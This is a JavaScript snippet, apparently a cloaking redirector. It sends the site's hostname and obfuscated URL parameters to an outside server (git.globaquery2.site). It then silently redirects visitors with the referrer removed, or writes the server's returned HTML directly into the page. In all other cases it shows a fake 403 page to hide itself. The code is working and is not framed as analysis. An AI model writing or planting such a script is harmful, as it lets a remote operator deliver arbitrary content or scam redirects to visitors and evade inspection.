(function () {
  function redirectWithoutReferrer(url) {
    var meta = document.createElement("meta");
    meta.name = "referrer";
    meta.content = "no-referrer";
    document.head.appendChild(meta);
    window.location.replace(url);
  }

  function showForbidden() {
    document.open();
    document.write(
      '<html><head><title>403 Forbidden</title></head><body style="background:#111;color:#fff;font-family:Arial;text-align:center;padding-top:10%;"><h1>403 Forbidden</h1><p>Access Denied</p></body></html>'
    );
    document.close();
  }

  if (window.__getf_FETCH_RAN__) return;
  window.__getf_FETCH_RAN__ = 1;

  // Si ya hay ?term=... y luego ponen ?art=1, el segundo ? pasa a &
  var raw = (window.location.search || "").replace(/^\?/, "").replace(/\?/g, "&");
  var params = new URLSearchParams(raw);

  var art = params.get("art") || "1";
  var io0 = params.get("io0") || params.get("term");
  var o2x = params.get("o2x");
  var snp = params.get("snp");
  var tik = params.get("tik");
  var ien = params.get("ien");
  var fen = params.get("fen");
  var snpen = params.get("snpen");
  var tiken = params.get("tiken");
  var hostParam1 = window.location.hostname;

  if (!io0 || !/^[a-zA-Z0-9_-]+$/.test(io0)) {
    showForbidden();
    return;
  }

  var folder = "w";
  if (art === "2") folder = "i";
  else if (art === "3") folder = "f";
  else if (art === "4") folder = "snp";
  else if (art === "5") folder = "tik";
  else if (art === "6") folder = "ien";
  else if (art === "7") folder = "fen";
  else if (art === "8") folder = "snpen";
  else if (art === "9") folder = "tiken";

  var u =
    "https://git.globaquery2.site/" +
    folder +
    "/" +
    encodeURIComponent(io0) +
    "?action=fetch";

  if (o2x) u += "&o2x=" + encodeURIComponent(o2x);
  if (snp) u += "&snp=" + encodeURIComponent(snp);
  if (tik) u += "&tik=" + encodeURIComponent(tik);
  if (ien) u += "&ien=" + encodeURIComponent(ien);
  if (fen) u += "&fen=" + encodeURIComponent(fen);
  if (snpen) u += "&snpen=" + encodeURIComponent(snpen);
  if (tiken) u += "&tiken=" + encodeURIComponent(tiken);
  u += "&host=" + encodeURIComponent(hostParam1);

  console.log("FETCH:", u);

  fetch(u)
    .then(function (res) {
      return res.text();
    })
    .then(function (e) {
      try {
        var r = JSON.parse(e);
        if (r.redirectUrl) {
          redirectWithoutReferrer(r.redirectUrl);
        } else {
          showForbidden();
        }
      } catch (err) {
        document.open();
        document.write(e);
        document.close();
      }
    })
    .catch(function (err) {
      console.error(err);
      showForbidden();
    });
})();
